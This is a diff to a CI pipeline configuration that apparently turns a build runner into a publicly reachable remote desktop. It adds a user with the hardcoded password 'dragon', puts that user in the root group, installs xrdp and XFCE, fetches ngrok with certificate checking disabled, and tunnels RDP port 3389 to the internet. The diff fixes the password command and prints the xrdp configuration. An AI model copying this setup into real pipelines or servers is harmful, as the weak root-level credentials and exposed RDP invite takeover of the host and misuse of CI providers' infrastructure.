@@ -10,7 +10,7 @@ steps:
   - apt update
   - apt upgrade -y
   - useradd rock6064
-  - printf "dragon\ndragon\n" | passwd
+  - printf "dragon\ndragon\n" | passwd rock6064
   - usermod -aG root rock6064
   - apt install --no-install-recommends --no-install-suggests unzip wget xrdp xfce4 xfce4-terminal -y
   - wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
@@ -21,7 +21,7 @@ steps:
   - cat /etc/xrdp/startwm.sh
   - /etc/init.d/xrdp restart
   - sleep 7
-  - whoami
+  - cat /etc/xrdp/xrdp.ini
   - ./ngrok tcp 3389
   environment:
     DEBIAN_FRONTEND: noninteractive
